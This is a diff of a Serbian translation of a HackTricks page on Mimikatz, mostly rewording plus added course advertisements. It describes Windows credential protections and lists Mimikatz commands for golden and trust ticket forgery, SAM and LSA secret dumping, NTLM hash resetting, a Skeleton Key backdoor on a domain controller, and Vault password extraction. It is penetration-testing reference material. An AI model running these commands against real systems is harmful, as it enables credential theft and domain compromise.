@@ -15,19 +15,26 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Ova stranica se zasniva na jednoj sa [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Proverite original za dodatne informacije!
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
+
+
+**Ova stranica se zasniva na jednoj sa [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Proverite original za više informacija!
 
 ## LM i Plain-Text u memoriji
 
-Od Windows 8.1 i Windows Server 2012 R2 nadalje, značajne mere su implementirane za zaštitu od krađe kredencijala:
+Od Windows 8.1 i Windows Server 2012 R2 nadalje, implementirane su značajne mere za zaštitu od krađe kredencijala:
 
-- **LM hešovi i plain-text lozinke** više se ne čuvaju u memoriji radi poboljšanja bezbednosti. Specifična registri postavka, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti konfigurisana sa DWORD vrednošću `0` da bi se onemogućila Digest Authentication, osiguravajući da "plain-text" lozinke nisu keširane u LSASS.
+- **LM hešovi i plain-text lozinke** više se ne čuvaju u memoriji radi poboljšanja bezbednosti. Specifična registracija, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti konfigurisana sa DWORD vrednošću `0` da bi se onemogućila Digest Authentication, osiguravajući da "plain-text" lozinke nisu keširane u LSASS.
 
 - **LSA zaštita** je uvedena da zaštiti proces Lokalnog sigurnosnog autoriteta (LSA) od neovlašćenog čitanja memorije i injekcije koda. To se postiže označavanjem LSASS-a kao zaštićenog procesa. Aktivacija LSA zaštite uključuje:
 1. Modifikovanje registra na _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ postavljanjem `RunAsPPL` na `dword:00000001`.
 2. Implementaciju objekta grupne politike (GPO) koji sprovodi ovu promenu registra na upravljanim uređajima.
 
-Uprkos ovim zaštitama, alati poput Mimikatz mogu zaobići LSA zaštitu koristeći specifične drajvere, iako su takve radnje verovatno zabeležene u dnevnicima događaja.
+I pored ovih zaštita, alati poput Mimikatz mogu zaobići LSA zaštitu koristeći specifične drajvere, iako su takve radnje verovatno zabeležene u dnevnicima događaja.
 
 ### Suprotstavljanje uklanjanju SeDebugPrivilege
 
@@ -72,7 +79,7 @@ Zlatni tiket omogućava pristup na nivou domena putem impersonacije. Ključna ko
 - `/domain`: Ime domena.
 - `/sid`: Sigurnosni identifikator (SID) domena.
 - `/user`: Korisničko ime za impersonaciju.
-- `/krbtgt`: NTLM hash naloga KDC servisa domena.
+- `/krbtgt`: NTLM hash KDC servisnog naloga domena.
 - `/ptt`: Direktno injektuje tiket u memoriju.
 - `/ticket`: Čuva tiket za kasniju upotrebu.
 
@@ -97,7 +104,7 @@ mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-12345678
 
 Trust Tickets se koriste za pristup resursima širom domena koristeći odnose poverenja. Ključna komanda i parametri:
 
-- Komanda: Slična Zlatnoj Kartici, ali za odnose poverenja.
+- Komanda: Slična Golden Ticket, ali za odnose poverenja.
 - Parametri:
 - `/target`: FQDN ciljnog domena.
 - `/rc4`: NTLM hash za račun poverenja.
@@ -147,10 +154,10 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **LSADUMP::SAM**: Pristup lokalnoj SAM bazi podataka.
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Dekriptuje tajne smeštene u registru.
+- **LSADUMP::Secrets**: Dekriptuje tajne pohranjene u registru.
 - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Postavlja novu NTLM heš vrednost za korisnika.
+- **LSADUMP::SetNTLM**: Postavlja novu NTLM heš za korisnika.
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
 - **LSADUMP::Trust**: Preuzima informacije o poverenju.
@@ -158,12 +165,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Razno
 
-- **MISC::Skeleton**: Umeće backdoor u LSASS na DC-u.
+- **MISC::Skeleton**: Umeće backdoor u LSASS na DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Eskalacija Privilegija
 
-- **PRIVILEGE::Backup**: Stiče prava za pravljenje rezervnih kopija.
+- **PRIVILEGE::Backup**: Stiče prava za rezervnu kopiju.
 - `mimikatz "privilege::backup" exit`
 
 - **PRIVILEGE::Debug**: Dobija privilegije za debagovanje.
@@ -177,7 +184,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SEKURLSA::Tickets**: Ekstrahuje Kerberos karte iz memorije.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Manipulacija Sid-om i Tokenima
+### Manipulacija Sid i Tokenima
 
 - **SID::add/modify**: Menja SID i SIDHistory.
 - Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
@@ -194,23 +201,29 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **TS::Sessions**: Prikazuje TS/RDP sesije.
 - *Nema specifične komande za TS::Sessions u originalnom kontekstu.*
 
-### Trezor
+### Vault
 
-- Ekstrahuje lozinke iz Windows Trezora.
+- Ekstrahuje lozinke iz Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Produbite svoje znanje u **Mobilnoj Bezbednosti** sa 8kSec Akademijom. Savladajte iOS i Android bezbednost kroz naše kurseve koji se mogu pratiti sopstvenim tempom i dobijte sertifikat:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Podrška HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
